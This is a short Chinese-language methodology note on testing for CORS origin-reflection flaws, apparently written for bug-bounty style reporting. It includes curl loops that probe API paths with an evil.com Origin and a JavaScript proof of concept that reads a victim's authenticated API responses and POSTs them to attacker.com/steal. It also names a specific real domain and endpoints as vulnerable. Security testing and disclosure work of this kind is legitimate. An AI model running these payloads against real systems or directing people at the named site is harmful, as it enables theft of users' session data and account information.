# CORS反射型漏洞测试方法

## 触发条件
服务器将请求中的Origin头直接反射到Access-Control-Allow-Origin响应头中

## 测试命令
```bash
# 基础测试
curl -sk -D- "https://TARGET/api/ENDPOINT" -H "Origin: https://evil.com"

# 检查响应头
# 正常: Access-Control-Allow-Origin: https://evil.com
# 正常: Access-Control-Allow-Credentials: true

# 测试多个API端点
for path in "/api/" "/api/cms/" "/api/user/" "/api/auth/" "/api/upload/"; do
  curl -sk -D- "https://TARGET${path}" -H "Origin: https://evil.com" | grep -iE "access-control"
done
```

## 漏洞判定
- Access-Control-Allow-Origin反射请求Origin → 漏洞存在
- Access-Control-Allow-Credentials: true → 可窃取凭证

## 攻击POC
```javascript
// 在evil.com域名下执行
fetch('https://TARGET/api/ENDPOINT', {
  credentials: 'include'
}).then(response => response.json())
.then(data => {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

## 报告角度
- "XXX网站CORS反射型漏洞致跨域数据窃取" [高危]
- CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N → 7.4

## 实战案例
- lycvc.linyi.cn: /api/cms/captchaImage和/api/cms/upload均存在CORS反射
